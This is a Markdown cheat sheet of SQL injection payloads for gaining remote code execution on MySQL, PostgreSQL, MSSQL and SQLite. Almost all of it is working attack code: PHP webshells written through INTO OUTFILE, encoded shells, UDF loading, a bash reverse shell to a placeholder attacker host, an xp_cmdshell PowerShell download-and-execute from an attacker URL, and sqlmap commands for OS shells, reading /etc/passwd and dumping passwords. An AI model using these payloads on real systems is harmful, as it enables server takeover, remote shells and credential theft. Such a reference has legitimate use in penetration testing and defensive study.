# SQLi to RCE — Attack Chain

## MySQL → RCE

### File Write → Webshell
```sql
-- INTO OUTFILE (requires FILE privilege and writable web dir)
' UNION SELECT NULL,'<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--

-- INTO DUMPFILE (binary-safe, for UDF)
' UNION SELECT NULL,0x3C3F7068702073797374656D28245F4745545B2263225D293B203F3E INTO DUMPFILE '/var/www/html/shell.php'--

-- LOAD DATA (if writable)
-- Access: http://TARGET/shell.php?c=id
```

### UDF (User-Defined Function)
```sql
-- 1. Find plugin directory
SELECT @@plugin_dir;  -- usually /usr/lib/mysql/plugin/

-- 2. Write UDF shared library
-- Use sqlmap's lib_mysqludf_sys.so or compile custom
-- Write via SELECT ... INTO DUMPFILE

-- 3. Create function
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/out');

-- sqlmap automated:
sqlmap -u "URL" --os-shell
```

### MySQL Client Arbitrary File Read
```bash
# If you control a MySQL server that the target connects to:
# Rogue MySQL server can read arbitrary files from client
# Tool: Rogue-MySql-Server
# Exploits LOAD DATA LOCAL INFILE
```

## PostgreSQL → RCE

### COPY TO PROGRAM (9.3+)
```sql
-- Direct command execution
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out';--

-- Reverse shell
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"';--
```

### Large Object + File Write
```sql
-- Create large object from file
SELECT lo_import('/etc/passwd');  -- returns oid

-- Write webshell via large object
SELECT lo_from_bytea(0, decode('PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==', 'base64'));
SELECT lo_export(0, '/var/www/html/shell.php');
```

### PL/pgSQL
```sql
-- If PL/pgSQL is available:
CREATE OR REPLACE FUNCTION cmd_exec(cmd text) RETURNS text AS $$
BEGIN
  RETURN (SELECT cmd_output FROM tmp_cmd_output);
END;
$$ LANGUAGE plpgsql;
```

## MSSQL → RCE

### xp_cmdshell
```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Execute commands
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')"';--
```

### OLE Automation
```sql
-- Alternative to xp_cmdshell
DECLARE @s INT;
EXEC sp_oacreate 'wscript.shell', @s OUT;
EXEC sp_oamethod @s, 'run', NULL, 'cmd /c whoami > C:\inetpub\wwwroot\out.txt';
```

### CLR Assembly
```sql
-- Create CLR assembly with command execution
-- Requires TRUSTWORTHY on database or asymmetric key signing
-- More complex but bypasses xp_cmdshell restrictions
```

## SQLite → RCE

### Attach Database → Webshell
```sql
-- Write PHP file via ATTACH
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.payload (data text);
INSERT INTO pwn.payload VALUES ('<?php system($_GET["c"]); ?>');
```

### Load Extension
```sql
-- If load_extension is enabled:
SELECT load_extension('/path/to/malicious.so');
```

## Escalation via sqlmap

```bash
# Direct OS shell (tries multiple techniques)
sqlmap -u "URL" --os-shell

# OS command execution
sqlmap -u "URL" --os-cmd "id"

# File read
sqlmap -u "URL" --file-read "/etc/passwd"

# File write
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Credential dump → pivot
sqlmap -u "URL" --passwords
```
